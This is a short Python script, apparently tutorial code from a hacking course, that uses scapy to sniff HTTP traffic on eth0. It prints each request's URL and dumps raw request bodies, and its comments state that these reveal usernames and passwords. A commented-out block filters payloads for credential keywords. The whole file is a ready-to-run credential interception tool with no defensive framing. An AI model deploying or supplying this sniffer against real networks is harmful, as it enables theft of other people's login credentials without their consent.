#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http  # to filter the http data 


def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=porcess_sniffed_packet)  # prn defines callback function
	# and we set store to false so that scapy won't store the sniffing packets in memory as we want to print it

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path  # to get the URL

def porcess_sniffed_packet(packet):

	if packet.haslayer(http.HTTPRequest):  # filtering http layer usig scapy's haslayer function
		# print(packet.show())    # through this we saw the packet's to select in which packet we can get useful info
		URL = get_url(packet)
		print("[+] HTTP Request: "+URL)
		
		if packet.haslayer(scapy.Raw):  # Raw is http layer where credentials get transfered
			print(packet[scapy.Raw])   # this print statement will now give you username and password
			# keep in mind Raw field not always contains credentials, websites use this field to transport other information too

			'''  # filter used to get only credentials:
			keywords = ["username","uname","email","login","password"]
			load = packet[scapy.Raw].load
			for keyword in keywords:
				if keyword in load:
					print("\n\n[+] Possible Credentials: "+load+"\n\n")
					break;
					'''

sniff("eth0")